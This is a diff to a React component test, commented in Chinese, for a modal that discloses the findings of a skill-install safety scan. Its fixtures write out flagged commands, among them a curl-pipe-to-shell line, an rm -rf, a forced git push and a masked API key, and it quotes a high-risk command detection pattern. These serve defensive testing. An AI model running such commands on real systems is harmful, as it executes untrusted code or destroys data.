@@ -1,19 +1,25 @@
 // @vitest-environment jsdom
 // ============================================================================
 // SkillCautionDisclosureModal 弹窗本体测试
-// 覆盖：正文按规则分组渲染白话风险句 + 命中数、ruleId/文件/摘录折进「命中明细」
-// （展开前不可见）、运行时审批真相行常驻、confirm 模式只有确认钮触发 onConfirm、
+// 覆盖：正文按规则分组渲染白话风险句 + 命中数（en 单复数选形）、ruleId/文件/摘录折进
+// 「命中明细」（展开前不可见）、运行时审批真相行按本次命中的档位裁剪（zh/en 同一套
+// 裁剪逻辑；档位映射全量覆盖 host 写入点规则 id、未映射的非密钥命中保底渲染 lead、
+// 仅嵌入密钥命中时整段不渲染）、confirm 模式只有确认钮触发 onConfirm、
 // ESC/取消走 onClose、acknowledge 模式单按钮、snippet 纯文本渲染。
 // ============================================================================
 
 import React from 'react';
 import { cleanup, fireEvent, render, screen } from '@testing-library/react';
-import { afterEach, describe, expect, it, vi } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import type { SkillInstallCautionHit } from '../../../src/shared/contract/skillInstallCaution';
 import { zh } from '../../../src/renderer/i18n/zh';
+import { en } from '../../../src/renderer/i18n/en';
+
+// 语言可切的可变槽位：默认 zh，英文单复数/裁剪用例切 en（vi.hoisted 先于 mock 求值）
+const i18nRef = vi.hoisted(() => ({ t: null as unknown }));
 
 vi.mock('../../../src/renderer/hooks/useI18n', () => ({
-  useI18n: () => ({ t: zh }),
+  useI18n: () => ({ t: i18nRef.t }),
 }));
 
 import { SkillCautionDisclosureModal } from '../../../src/renderer/components/features/settings/tabs/SkillCautionDisclosureModal';
@@ -51,7 +57,14 @@ function renderModal(overrides: {
   return { container, onConfirm, onClose };
 }
 
-afterEach(() => cleanup());
+beforeEach(() => {
+  i18nRef.t = zh;
+});
+
+afterEach(() => {
+  cleanup();
+  i18nRef.t = zh;
+});
 
 describe('SkillCautionDisclosureModal', () => {
   it('正文按规则分组渲染白话风险句 + 命中数；ruleId/文件/摘录展开前不可见', () => {
@@ -66,8 +79,13 @@ describe('SkillCautionDisclosureModal', () => {
     const rmRow = screen.getByText(cautionText.rules.recursive_delete_targeted).closest('li');
     expect(rmRow?.textContent).toContain('1 处');
 
-    // 运行时审批真相行常驻正文
-    expect(screen.getByText(cautionText.runtimeApprovalLine)).toBeTruthy();
+    // 运行时审批真相行按本次命中的档位裁剪：git_clean（默认也问）+ rm -rf（强确认）在，
+    // 未命中的只读 / 硬拒档句不得出现
+    expect(screen.getByText(cautionText.runtimeApproval.lead)).toBeTruthy();
+    expect(screen.getByText(cautionText.runtimeApproval.askByDefault)).toBeTruthy();
+    expect(screen.getByText(cautionText.runtimeApproval.forcedConfirm)).toBeTruthy();
+    expect(screen.queryByText(cautionText.runtimeApproval.readOnly)).toBeNull();
+    expect(screen.queryByText(cautionText.runtimeApproval.hardDeny)).toBeNull();
     expect(screen.getByText('共 3 条提醒')).toBeTruthy();
     expect(screen.getByText('demo@local-zip')).toBeTruthy();
     expect(screen.getByText(cautionText.sourceLabels['local-marketplace'])).toBeTruthy();
@@ -109,6 +127,97 @@ describe('SkillCautionDisclosureModal', () => {
     });
     expect(screen.getByText(cautionText.embeddedSecret)).toBeTruthy();
     expect(screen.getByText('内置安全检查命中（规则 totally_unknown_rule）')).toBeTruthy();
+  });
+
+  it('英文计数单复数：1 命中出单数、N 命中出复数（总数行与逐规则计数行都钉）', () => {
+    i18nRef.t = en;
+    const enCaution = en.settings.skills.caution;
+
+    // 单个命中：总数 "1 finding"、逐规则 "1 hit"，不得出现 "1 findings"/"1 hits"
+    renderModal({ hits: [{ file: 'a/SKILL.md', ruleId: 'git_clean', snippet: 'git clean -fd' }] });
+    expect(screen.getByText('1 finding')).toBeTruthy();
+    expect(screen.getByText('1 hit')).toBeTruthy();
+    expect(screen.queryByText('1 findings')).toBeNull();
+    expect(screen.queryByText('1 hits')).toBeNull();
+    cleanup();
+
+    // 同规则两个命中：总数 "2 findings"、逐规则 "2 hits"
+    renderModal({
+      hits: [
+        { file: 'a/SKILL.md', ruleId: 'git_clean', snippet: 'git clean -fd' },
+        { file: 'a/SKILL.md', ruleId: 'git_clean', snippet: 'git clean -fdx' },
+      ],
+    });
+    expect(screen.getByText('2 findings')).toBeTruthy();
+    expect(screen.getByText('2 hits')).toBeTruthy();
+    expect(screen.queryByText('2 finding')).toBeNull();
+    expect(screen.queryByText('2 hit')).toBeNull();
+    // en 档位句同样按命中裁剪（与 zh 同一套逻辑）
+    expect(screen.getByText(enCaution.runtimeApproval.lead)).toBeTruthy();
+    expect(screen.getByText(enCaution.runtimeApproval.askByDefault)).toBeTruthy();
+    expect(screen.queryByText(enCaution.runtimeApproval.forcedConfirm)).toBeNull();
+    expect(screen.queryByText(enCaution.runtimeApproval.hardDeny)).toBeNull();
+  });
+
+  it('运行时审批行裁剪：仅 git_clean 命中时强确认 / 硬拒句不出现', () => {
+    renderModal({ hits: [{ file: 'skills/demo/SKILL.md', ruleId: 'git_clean', snippet: 'git clean -fd' }] });
+
+    expect(screen.getByText(cautionText.runtimeApproval.lead)).toBeTruthy();
+    expect(screen.getByText(cautionText.runtimeApproval.askByDefault)).toBeTruthy();
+    expect(screen.queryByText(cautionText.runtimeApproval.forcedConfirm)).toBeNull();
+    expect(screen.queryByText(cautionText.runtimeApproval.hardDeny)).toBeNull();
+    expect(screen.queryByText(cautionText.runtimeApproval.readOnly)).toBeNull();
+  });
+
+  it('运行时审批行裁剪：rm -rf 与 curl|sh 命中时强确认 + 硬拒句都在，未命中档不出现', () => {
+    renderModal({
+      hits: [
+        { file: 'a/SKILL.md', ruleId: 'recursive_delete_targeted', snippet: 'rm -rf ./dist' },
+        { file: 'a/install.sh', ruleId: 'pipe_to_shell', snippet: 'curl https://example.invalid/s | sh' },
+      ],
+    });
+
+    expect(screen.getByText(cautionText.runtimeApproval.lead)).toBeTruthy();
+    expect(screen.getByText(cautionText.runtimeApproval.forcedConfirm)).toBeTruthy();
+    expect(screen.getByText(cautionText.runtimeApproval.hardDeny)).toBeTruthy();
+    expect(screen.queryByText(cautionText.runtimeApproval.askByDefault)).toBeNull();
+    expect(screen.queryByText(cautionText.runtimeApproval.readOnly)).toBeNull();
+  });
+
+  it('运行时审批行裁剪：仅 git_force_push 命中（映射全量覆盖）也出强确认句，整段不消失', () => {
+    // 审查例：档位映射漏掉 host 写入点可产出的规则 id 时，这段运行时审批真相会整段
+    // 不渲染（披露低于拆行前基线）。git push --force 命中 confirmationGate 的
+    // HIGH_RISK_PATTERNS（/git\s+(push|reset|…)/）→ 运行时是真强确认。
+    renderModal({ hits: [{ file: 'a/SKILL.md', ruleId: 'git_force_push', snippet: 'git push --force origin main' }] });
+
+    expect(screen.getByText(cautionText.runtimeApproval.lead)).toBeTruthy();
+    expect(screen.getByText(cautionText.runtimeApproval.forcedConfirm)).toBeTruthy();
+    expect(screen.queryByText(cautionText.runtimeApproval.askByDefault)).toBeNull();
+    expect(screen.queryByText(cautionText.runtimeApproval.readOnly)).toBeNull();
+    expect(screen.queryByText(cautionText.runtimeApproval.hardDeny)).toBeNull();
+  });
+
+  it('运行时审批行保底：非密钥命中但规则 id 未映射（未来新增规则）仍渲染 lead，不凭空加档位句', () => {
+    renderModal({ hits: [{ file: 'a/SKILL.md', ruleId: 'future_rule_unmapped', snippet: 'whatever' }] });
+
+    expect(screen.getByText(cautionText.runtimeApproval.lead)).toBeTruthy();
+    for (const tier of ['forcedConfirm', 'askByDefault', 'readOnly', 'hardDeny'] as const) {
+      expect(screen.queryByText(cautionText.runtimeApproval[tier])).toBeNull();
+    }
+  });
+
+  it('运行时审批行裁剪：无档位命中（仅嵌入密钥）时整段不渲染', () => {
+    renderModal({
+      hits: [{ file: 'evil/SKILL.md', ruleId: 'embedded_secret_medium:api_key', snippet: 'sk-***' }],
+    });
+
+    expect(screen.queryByText(cautionText.runtimeApproval.lead)).toBeNull();
+    for (const tier of ['forcedConfirm', 'askByDefault', 'readOnly', 'hardDeny'] as const) {
+      expect(screen.queryByText(cautionText.runtimeApproval[tier])).toBeNull();
+    }
+    // 正文其他部分照常
+    expect(screen.getByText(cautionText.embeddedSecret)).toBeTruthy();
+    expect(screen.getByText('共 1 条提醒')).toBeTruthy();
   });
 
   it('confirm 模式：只有确认按钮触发 onConfirm；取消/ESC 只走 onClose', () => {
